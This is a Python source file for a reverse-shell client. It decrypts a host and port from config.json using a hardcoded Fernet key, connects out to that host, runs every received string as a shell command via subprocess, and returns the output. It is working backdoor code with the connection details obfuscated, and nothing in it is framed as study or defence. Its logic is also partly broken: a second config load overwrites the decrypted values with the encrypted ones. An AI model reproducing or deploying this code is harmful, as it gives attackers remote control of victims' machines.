import socket
import subprocess
import json
from cryptography.fernet import Fernet

key = b'FtABmI-psWsyRuNo-ZqCGFjhdhUlB6RcNxORcdKcN7Q='
cipher = Fernet(key)

with open('config.json', 'r') as file:
    data = json.load(file)

# Decrypt the specific fields
# We encode the string back to bytes for Fernet, then decode the result to plaintext
host = cipher.decrypt(data['host'].encode()).decode()
port = cipher.decrypt(data['port'].encode()).decode()

# Load config
try:
    with open('config.json', 'r') as file:
        data = json.load(file)
        host = data['host']
        port = int(data['port'])
except (FileNotFoundError, KeyError, ValueError) as e:
    print(f"Config error: {e}")
    exit(1)

def connect_to_server(host=host, port=port):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, port))
        return s
    except ConnectionRefusedError:
        print("Could not connect to server.")
        return None

def execute_command(cmd):
    try:
        # shell=True is needed for built-in commands like 'dir' or 'echo'
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
        return result.decode()
    except subprocess.CalledProcessError as e:
        return e.output.decode() # Return the actual error from the shell
    except Exception as e:
        return str(e)

def main():
    s = connect_to_server()
    if not s: return

    while True:
        try:
            data_recv = s.recv(1024).decode().strip()
            if not data_recv or data_recv.lower() == 'exit':
                break
            
            result = execute_command(data_recv)
            
            if not result:
                result = "Command executed (no output)."
            
            # sendall ensures the entire buffer is pushed through the socket
            s.sendall(result.encode())
        except Exception as e:
            print(f"Runtime error: {e}")
            break
    
    s.close()

if __name__ == "__main__":
    main()
